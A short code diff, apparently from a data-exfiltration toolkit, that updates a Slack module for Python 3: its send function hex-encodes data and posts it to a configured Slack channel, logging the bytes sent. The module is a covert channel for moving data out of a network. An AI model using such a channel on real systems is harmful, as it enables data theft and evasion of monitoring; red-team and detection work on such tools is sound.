@@ -1,4 +1,5 @@
-from slackclient import SlackClient
+from binascii import hexlify
+from slackbot.slackclient import SlackClient
 import time
 
 app_exfiltrate = None
@@ -10,7 +11,7 @@ def send(data):
     global sc
     chan = config['chan_id']
     app_exfiltrate.log_message('info', "[slack] Sending {} bytes with Slack".format(len(data)))
-    data = data.encode('hex')
+    data = hexlify(data.encode())
 
     sc.api_call("api.text")
     sc.api_call("chat.postMessage", as_user="true:", channel=chan, text=data)
